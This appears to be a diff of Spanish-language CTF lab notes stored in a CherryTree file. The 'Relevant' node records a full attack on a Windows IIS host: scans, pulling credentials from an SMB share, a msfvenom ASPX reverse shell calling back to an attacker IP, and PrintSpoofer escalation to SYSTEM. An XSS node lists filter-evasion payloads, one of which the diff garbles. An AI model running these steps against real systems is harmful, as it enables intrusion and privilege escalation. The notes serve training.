-          <cell>NetBIOS-SSN</cell>
-          <cell>Samba smbd 3.X - 4.X</cell>
-        </row>
-        <row>
-          <cell>Puerto</cell>
-          <cell>Servicio</cell>
-          <cell>Versión</cell>
-        </row>
-      </table>
     </node>
     <node unique_id="46" master_id="0" name="GameZone" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1764532907" ts_lastsave="1778686266">
       <rich_text>sudo nmap -sV --top-ports 100 10.65.134.117
@@ -2518,310 +2177,149 @@ sudo -l
       <rich_text scale="small"> Root Access Achieved
 </rich_text>
     </node>
-    <node unique_id="48" master_id="0" name="Relevant" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1765078270" ts_lastsave="1765078275">
-      <rich_text scale="small">
-Pentesting Windows IIS - Notas Rápidas
+    <node unique_id="48" master_id="0" name="Relevant" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1765078270" ts_lastsave="1779601483">
+      <rich_text>sudo nmap -sV --top-ports 1000 10.64.136.185
+sudo: unable to resolve host ip-10-64-66-138: Name or service not known
+Starting Nmap 7.80 ( </rich_text>
+      <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+      <rich_text> ) at 2026-05-24 05:04 BST
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 10.64.136.185
+Host is up (0.00055s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
-🎯 Objetivo
-• </rich_text>
-      <rich_text scale="small" weight="heavy">IP Target</rich_text>
-      <rich_text scale="small">: 10.64.153.187 / 10.67.130.206
-• </rich_text>
-      <rich_text scale="small" weight="heavy">SO</rich_text>
-      <rich_text scale="small">: Windows Server 2008 R2 - 2012
-• </rich_text>
-      <rich_text scale="small" weight="heavy">Servicio Principal</rich_text>
-      <rich_text scale="small">: Microsoft IIS 10.0
-
-
-📡 Reconocimiento Inicial
-
-Curl básico
-</rich_text>
-      <rich_text family="monospace" scale="small">curl http://10.64.153.187 -v
-</rich_text>
-      <rich_text scale="small">◇ Revela: IIS 10.0, ASP.NET
-◇ Página por defecto de IIS
+Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
 
 
-Escaneo Nmap completo
-</rich_text>
-      <rich_text family="monospace" scale="small">sudo nmap -sV 10.64.153.187 -p- -T4 -Pn
-</rich_text>
-      <rich_text scale="small" weight="heavy">Puertos abiertos encontrados:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">80/tcp</rich_text>
-      <rich_text scale="small"> - HTTP (IIS 10.0)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">135/tcp</rich_text>
-      <rich_text scale="small"> - MSRPC
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">139/tcp</rich_text>
-      <rich_text scale="small"> - NetBIOS-SSN
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">445/tcp</rich_text>
-      <rich_text scale="small"> - SMB (Microsoft-DS)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">3389/tcp</rich_text>
-      <rich_text scale="small"> - RDP (Terminal Services)
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">49663/tcp</rich_text>
-      <rich_text scale="small"> - HTTP (IIS 10.0) ⚠️ Alternativo
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">49666-49667/tcp</rich_text>
-      <rich_text scale="small"> - MSRPC
+sudo nmap -sV -sC --script=vuln 10.64.136.185
+sudo: unable to resolve host ip-10-64-66-138: Name or service not known
+Starting Nmap 7.80 ( </rich_text>
+      <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+      <rich_text> ) at 2026-05-24 05:34 BST
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.38% done; ETC: 05:35 (0:00:00 remaining)
+Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.38% done; ETC: 05:35 (0:00:00 remaining)
+Nmap scan report for 10.64.136.185
+Host is up (0.00035s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+135/tcp  open  msrpc         Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_sslv2-drown: 
+49663/tcp open  http          Microsoft IIS httpd 10.0
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+49666/tcp open  msrpc         Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49667/tcp open  msrpc         Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
 
-🗂️ Enumeración SMB
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       </rich_text>
+      <rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</rich_text>
+      <rich_text>
+|       </rich_text>
+      <rich_text link="webs https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</rich_text>
+      <rich_text>
+|_      </rich_text>
+      <rich_text link="webs https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</rich_text>
+      <rich_text>
 
-Listar recursos compartidos
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient -L \\\\10.64.153.187\\
-</rich_text>
-      <rich_text scale="small">
-Conectar a share específico
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient \\\\10.67.130.206\\nt4wrksv
-</rich_text>
-      <rich_text scale="small">
-Descargar archivos
-</rich_text>
-      <rich_text family="monospace" scale="small">get passwords.txt
-</rich_text>
-      <rich_text scale="small">
-🔓 Extracción de Credenciales
+Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 148.66 seconds
 
-Archivo encontrado: passwords.txt
-</rich_text>
-      <rich_text family="monospace" scale="small">cat passwords.txt
-</rich_text>
-      <rich_text scale="small" weight="heavy">Contenido Base64:</rich_text>
-      <rich_text scale="small">
-</rich_text>
-      <rich_text family="monospace" scale="small">Qm9iIC0gIVBAJCRXMHJEITEyMw==
-QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
-</rich_text>
-      <rich_text scale="small">
-Decodificar credenciales
-</rich_text>
-      <rich_text family="monospace" scale="small">echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
-# Bob - !P@$$W0rD!123
+search ms17-010
+use 0
+set RHOSTS 10.64.136.185
 
-echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
-# Bill - Juw4nnaM4n420696969!$$$
-</rich_text>
-      <rich_text scale="small" weight="heavy">Credenciales obtenidas:</rich_text>
-      <rich_text scale="small">
-◇ Usuario: </rich_text>
-      <rich_text family="monospace" scale="small">Bob</rich_text>
-      <rich_text scale="small"> | Pass: </rich_text>
-      <rich_text family="monospace" scale="small">!P@$$W0rD!123</rich_text>
-      <rich_text scale="small">
-◇ Usuario: </rich_text>
-      <rich_text family="monospace" scale="small">Bill</rich_text>
-      <rich_text scale="small"> | Pass: </rich_text>
-      <rich_text family="monospace" scale="small">Juw4nnaM4n420696969!$$$</rich_text>
-      <rich_text scale="small">
+dirsearch -u </rich_text>
+      <rich_text link="webs http://10.64.136.185:49663">http://10.64.136.185:49663</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
+accedemos a </rich_text>
+      <rich_text link="webs http://10.64.136.185:49663/nt4wrksv/">http://10.64.136.185:49663/nt4wrksv/</rich_text>
+      <rich_text>
 
-🔍 Fuzzing de Directorios
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.64.135.223 LPORT=1234 -f aspx &gt; exploit.aspx
 
-Gobuster
-</rich_text>
-      <rich_text family="monospace" scale="small">gobuster dir -u http://10.67.130.206 \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -t 50 \
-  -x php,html,txt \
-  -o resultado.txt
-</rich_text>
-      <rich_text scale="small" weight="heavy">Resultado:</rich_text>
-      <rich_text scale="small"> Solo errores 400, no se encontraron directorios válidos
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.64.66.138
+set LPORT 1234
+run
 
-💉 Explotación
+getuid
+getprivs
 
-1. Crear Reverse Shell (ASPX)
-</rich_text>
-      <rich_text family="monospace" scale="small">msfvenom -p windows/x64/shell_reverse_tcp \
-  LHOST=10.67.77.217 \
-  LPORT=9000 \
-  -f aspx \
-  -o shell.aspx
-</rich_text>
-      <rich_text scale="small" weight="heavy">Parámetros:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">LHOST</rich_text>
-      <rich_text scale="small">: IP del atacante
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">LPORT</rich_text>
-      <rich_text scale="small">: Puerto de escucha
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-f aspx</rich_text>
-      <rich_text scale="small">: Formato para IIS
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-o</rich_text>
-      <rich_text scale="small">: Archivo de salida
+Enabled Process Privileges
+==========================
 
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
 
-2. Subir shell via SMB
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient \\\\10.67.130.206\\nt4wrksv
-put shell.aspx
-</rich_text>
-      <rich_text scale="small">
-3. Listener en atacante
-</rich_text>
-      <rich_text family="monospace" scale="small">nc -lvnp 9000
-</rich_text>
-      <rich_text scale="small">
-4. Trigger del shell
-Navegar a: </rich_text>
-      <rich_text family="monospace" scale="small">http://10.67.130.206:49663/nt4wrksv/shell.aspx</rich_text>
-      <rich_text scale="small">
+wget </rich_text>
+      <rich_text link="webs https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe">https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</rich_text>
+      <rich_text>
 
-⚡ Post-Explotación
+smbclient //10.64.135.223/nt4wrksv
+put PrintSpoofer64.exe
 
-Shell recibida
-</rich_text>
-      <rich_text family="monospace" scale="small">Microsoft Windows [Version 10.0.14393]
-</rich_text>
-      <rich_text scale="small">
-Verificar usuario actual
-</rich_text>
-      <rich_text family="monospace" scale="small">whoami
-# iis apppool\defaultapppool
-</rich_text>
-      <rich_text scale="small">
-Verificar privilegios
-</rich_text>
-      <rich_text family="monospace" scale="small">whoami /priv
-</rich_text>
-      <rich_text scale="small" weight="heavy">Privilegios clave:</rich_text>
-      <rich_text scale="small">
-◇ ✅ </rich_text>
-      <rich_text family="monospace" scale="small">SeImpersonatePrivilege</rich_text>
-      <rich_text scale="small"> - </rich_text>
-      <rich_text scale="small" weight="heavy">ENABLED</rich_text>
-      <rich_text scale="small"> (vulnerable a Potato attacks)
-◇ ✅ </rich_text>
-      <rich_text family="monospace" scale="small">SeAssignPrimaryTokenPrivilege</rich_text>
-      <rich_text scale="small">
-◇ ✅ </rich_text>
-      <rich_text family="monospace" scale="small">SeChangeNotifyPrivilege</rich_text>
-      <rich_text scale="small">
-
-
-🚀 Escalación de Privilegios
-
-Herramienta: PrintSpoofer.exe
-</rich_text>
-      <rich_text scale="small" weight="heavy">Requisitos:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">SeImpersonatePrivilege</rich_text>
-      <rich_text scale="small"> habilitado
-◇ Windows 10/Server 2016+
-
-
-1. Subir exploit
-</rich_text>
-      <rich_text family="monospace" scale="small">smbclient \\\\10.67.130.206\\nt4wrksv
-put PrintSpoofer.exe
-</rich_text>
-      <rich_text scale="small">
-2. Ejecutar desde shell
-</rich_text>
-      <rich_text family="monospace" scale="small">PrintSpoofer.exe -i -c cmd
-</rich_text>
-      <rich_text scale="small" weight="heavy">Parámetros:</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-i</rich_text>
-      <rich_text scale="small">: Interactivo
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">-c cmd</rich_text>
-      <rich_text scale="small">: Comando a ejecutar con privilegios
-
-</rich_text>
-      <rich_text scale="small" weight="heavy">Resultado esperado:</rich_text>
-      <rich_text scale="small"> Shell como </rich_text>
-      <rich_text family="monospace" scale="small">NT AUTHORITY\SYSTEM</rich_text>
-      <rich_text scale="small">
-
-📝 Resumen del Ataque
-1. </rich_text>
-      <rich_text scale="small" weight="heavy">Reconocimiento</rich_text>
-      <rich_text scale="small"> → Nmap revela IIS + SMB
-2. </rich_text>
-      <rich_text scale="small" weight="heavy">Enumeración SMB</rich_text>
-      <rich_text scale="small"> → Encontramos share </rich_text>
-      <rich_text family="monospace" scale="small">nt4wrksv</rich_text>
-      <rich_text scale="small"> con credenciales
-3. </rich_text>
-      <rich_text scale="small" weight="heavy">Explotación Web</rich_text>
-      <rich_text scale="small"> → Upload de shell ASPX via SMB
-4. </rich_text>
-      <rich_text scale="small" weight="heavy">Acceso Inicial</rich_text>
-      <rich_text scale="small"> → Shell como </rich_text>
-      <rich_text family="monospace" scale="small">iis apppool\defaultapppool</rich_text>
-      <rich_text scale="small">
-5. </rich_text>
-      <rich_text scale="small" weight="heavy">Privesc</rich_text>
-      <rich_text scale="small"> → PrintSpoofer explota </rich_text>
-      <rich_text family="monospace" scale="small">SeImpersonatePrivilege</rich_text>
-      <rich_text scale="small">
-6. </rich_text>
-      <rich_text scale="small" weight="heavy">Compromiso Total</rich_text>
-      <rich_text scale="small"> → Shell como SYSTEM
-
-🛠️ Herramientas Utilizadas
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">nmap</rich_text>
-      <rich_text scale="small"> - Escaneo de puertos
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">smbclient</rich_text>
-      <rich_text scale="small"> - Acceso a recursos SMB
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">gobuster</rich_text>
-      <rich_text scale="small"> - Fuzzing de directorios
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">msfvenom</rich_text>
-      <rich_text scale="small"> - Generación de payload
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">netcat</rich_text>
-      <rich_text scale="small"> - Listener para reverse shell
-◇ </rich_text>
-      <rich_text family="monospace" scale="small">PrintSpoofer.exe</rich_text>
-      <rich_text scale="small"> - Escalación de privilegios
-
-
-⚠️ Vulnerabilidades Explotadas
-1. </rich_text>
-      <rich_text scale="small" weight="heavy">SMB con acceso anónimo/débil</rich_text>
-      <rich_text scale="small"> → Lectura de archivos sensibles
-2. </rich_text>
-      <rich_text scale="small" weight="heavy">Credenciales en texto claro</rich_text>
-      <rich_text scale="small"> → Mal manejo de secretos
-3. </rich_text>
-      <rich_text scale="small" weight="heavy">Upload sin validación</rich_text>
-      <rich_text scale="small"> → Ejecución de ASPX malicioso
-4. </rich_text>
-      <rich_text scale="small" weight="heavy">SeImpersonatePrivilege</rich_text>
-      <rich_text scale="small"> → Potato attack (PrintSpoofer)
-
-🔗 Referencias
-◇ </rich_text>
-      <rich_text link="webs https://github.com/itm4n/PrintSpoofer" scale="small">PrintSpoofer - GitHub</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text link="webs https://github.com/frizb/MSF-Venom-Cheatsheet" scale="small">MSFVenom Cheatsheet</rich_text>
-      <rich_text scale="small">
-◇ </rich_text>
-      <rich_text link="webs https://jlajara.gitlab.io/Potatoes_Windows_Privesc" scale="small">Potato Privilege Escalation</rich_text>
-      <rich_text scale="small">
-
-</rich_text>
+en meterpreter usamos
+cd c:\inetpub\wwwroot\nt4wrksv
+PrintSpoofer64.exe -i -c powershell.exe</rich_text>
     </node>
     <node unique_id="49" master_id="0" name="Internal" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1765228304" ts_lastsave="1765228314">
       <rich_text scale="small">
@@ -7742,7 +7240,7 @@ Resumen y recomendaciones
 7. Decodificar base64 para revelar la bandera.
 </rich_text>
   </node>
-  <node unique_id="23" master_id="0" name="XSS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1754330155" ts_lastsave="1754411111">
+  <node unique_id="23" master_id="0" name="XSS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1754330155" ts_lastsave="1779382898">
     <rich_text scale="small">XSS: Cross-Site Scripting, ataque de inyección que ejecuta JavaScript malicioso en usuarios de una web.
 
 Payload: Código JavaScript que queremos ejecutar en la víctima; consta de intención y modificación.
@@ -7783,7 +7281,7 @@ Payload nivel 3 (escapar textarea): &lt;/textarea&gt;&lt;script&gt;alert('THM');
 
 Payload nivel 4 (escapar JS inline): ';alert('THM');// - cerrar cadena JS y comentar resto para ejecutar código.
 
-Payload nivel 5 (evadir filtros): &lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt; - evadir filtro que elimina palabra script.
+Payload nivel 5 (evadir filtros): &lt;sscriptcrilert('pt&gt;aTHM');&lt;/sscriptcript&gt; - evadir filtro que elimina palabra script.
 
 Payload nivel 6 (usar atributo onload): /images/cat.jpg" onload="alert('THM'); - usar onload en img para ejecutar script sin &lt; &gt;.
 
